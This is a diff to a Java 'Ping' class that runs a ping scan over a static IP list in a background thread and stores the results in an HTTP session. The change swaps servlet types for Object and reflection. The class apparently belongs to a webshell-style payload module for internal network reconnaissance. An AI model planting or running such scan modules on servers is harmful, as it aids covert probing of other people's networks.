@@ -6,23 +6,20 @@ import java.net.UnknownHostException;
 import java.util.HashMap;
 import java.util.Iterator;
 import java.util.Map;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
 
 public class Ping implements Runnable {
    public static String ipList;
    public static String taskID;
-   private HttpSession Session;
+   private Object Session;
 
    public Ping() {
    }
 
-   public Ping(HttpSession session) {
+   public Ping(Object session) {
       this.Session = session;
    }
 
-   public void execute(ServletRequest request, ServletResponse response, HttpSession session) throws Exception {
+   public void execute(Object request, Object response, Object session) throws Exception {
       (new Thread(new Ping(session))).start();
    }
 
@@ -82,7 +79,7 @@ public class Ping implements Runnable {
                sessionObj.put("result", this.buildJson(scanResult, false));
             }
 
-            this.Session.setAttribute(taskID, sessionObj);
+            this.sessionSetAttribute(this.Session, taskID, sessionObj);
          }
       } catch (Exception var10) {
          sessionObj.put("result", var10.getMessage());
@@ -128,5 +125,13 @@ public class Ping implements Runnable {
 
       sb.append("}");
       return sb.toString();
+   }
+
+   private void sessionSetAttribute(Object session, String key, Object value) {
+      try {
+         session.getClass().getDeclaredMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
+      } catch (Exception var5) {
+      }
+
    }
 }
